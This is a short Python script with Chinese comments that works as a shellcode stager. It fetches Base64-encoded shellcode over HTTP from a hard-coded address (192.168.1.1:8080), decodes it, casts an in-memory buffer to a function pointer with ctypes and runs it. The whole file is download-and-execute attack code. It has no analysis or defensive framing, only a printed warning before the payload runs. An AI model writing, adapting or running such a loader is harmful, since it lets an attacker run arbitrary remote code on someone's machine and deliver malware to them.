import requests
import base64
import ctypes

def execute_shellcode(url):
    """
    从指定 URL 下载 Base64 编码的 shellcode，解码后加载到内存并执行
    参数:
        url: 包含 Base64 编码 shellcode 的远程 URL
    返回:
        无返回值，执行 shellcode 或抛出异常
    """
    try:
        # 发送 HTTP GET 请求获取 shellcode 数据
        response = requests.get(url, timeout=5)
        
        # 检查响应状态码
        if response.status_code != 200:
            raise Exception(f"HTTP 请求失败，状态码: {response.status_code}")
        
        # 获取响应文本（假设为 Base64 编码的字符串）
        shellcode_b64 = response.text.strip()
        
        # 解码 Base64 数据
        try:
            shellcode = base64.b64decode(shellcode_b64)
        except base64.binascii.Error as e:
            raise Exception(f"Base64 解码失败: {e}")
        
        # 检查 shellcode 是否为空
        if not shellcode:
            raise Exception("解码后的 shellcode 为空")
        
        # 创建缓冲区存储 shellcode
        shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
        
        # 将缓冲区转换为可执行函数指针
        shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
        
        # 执行 shellcode
        print("警告: 即将执行远程 shellcode!")
        shellcode_func()
        
    except requests.RequestException as e:
        print(f"HTTP 请求错误: {e}")
    except Exception as e:
        print(f"执行失败: {e}")
    finally:
        # 确保释放资源
        try:
            del shellcode_buffer
        except:
            pass

if __name__ == "__main__":
    # 定义远程 shellcode 的 URL
    url = "http://192.168.1.1:8080/shellcode.bin"
    
    # 执行 shellcode
    execute_shellcode(url)